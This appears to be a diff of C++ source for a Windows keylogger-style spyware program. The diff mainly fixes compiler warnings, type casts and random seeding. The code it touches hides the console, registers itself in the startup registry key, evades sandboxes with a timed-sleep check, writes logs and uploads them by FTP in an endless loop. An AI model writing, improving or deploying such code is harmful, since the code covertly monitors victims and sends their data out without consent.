@@ -8,10 +8,12 @@
 #include <slpublic.h>
 #include <vector>
 #include <shellapi.h>
+#include <time.h>
 //#include <Wbemidl.h>
 //#include <wbemcli.h>
 
-
+#pragma warning( push )
+#pragma warning( disable : 4477 )
 
 
 typedef std::string String;
@@ -45,6 +47,9 @@ typedef unsigned long long uint64_t;
 
 
 FILE* OUTPUT_FILE;
+
+
+extern "C" int RandomGenerator();
 
 
 bool IsBrowsePath(const String& path)
@@ -101,7 +106,7 @@ BOOL RegisterMyProgramForStartup(PCSTR pszAppName, PCSTR pathToExe, PCSTR args)
 
     if (fSuccess)
     {
-        dwSize = (strlen(szValue) + 1) * 2;
+        dwSize = (DWORD)(strlen(szValue) + 1) * 2;
         lResult = RegSetValueExA(hKey, pszAppName, 0, REG_SZ, (BYTE*)szValue, dwSize);
         fSuccess = (lResult == 0);
     }
@@ -186,14 +191,10 @@ void FileSubmit(const char* localfile, const char* remotefile)
         else
         {
 
-            if (FtpPutFileA(hFtpSession, localfile, remotefile, FTP_TRANSFER_TYPE_BINARY, 0));
-
+            if (FtpPutFileA(hFtpSession, localfile, remotefile, FTP_TRANSFER_TYPE_BINARY, 0)){}
         }
     }
 }
-
-
-
 
 
 void LogItChar(std::string Value, std::string FileName) {
@@ -237,7 +238,7 @@ ULONG WINAPI Protect(LPVOID Parameter) {
 }
 
 
-void main()
+int main()
 {
 
     FreeConsole();
@@ -249,7 +250,7 @@ void main()
 
     DWORD Tick1 = GetTickCount();
 
-    srand(Tick1 * GetCurrentProcessId());
+    srand((int)time(NULL) * Tick1 * GetCurrentProcessId() * (DWORD)RandomGenerator());
 
 #ifndef debug
 
@@ -259,9 +260,9 @@ void main()
         Sleep(DividedSleep);
     }
 
-    auto PatchCheck = GetTickCount();
+    DWORD PatchCheck = GetTickCount();
 
-    if (PatchCheck - Tick1 < Time - 5000) {
+    if ((int)(PatchCheck - Tick1) < Time - 5000) {
         exit(1);
     }
 
@@ -541,4 +542,7 @@ Log:
      FileSubmit(CurrentLog.c_str(),RemoteFile.c_str());
      */
      goto Log;
+     return 0;
 }
+
+#pragma warning( pop )
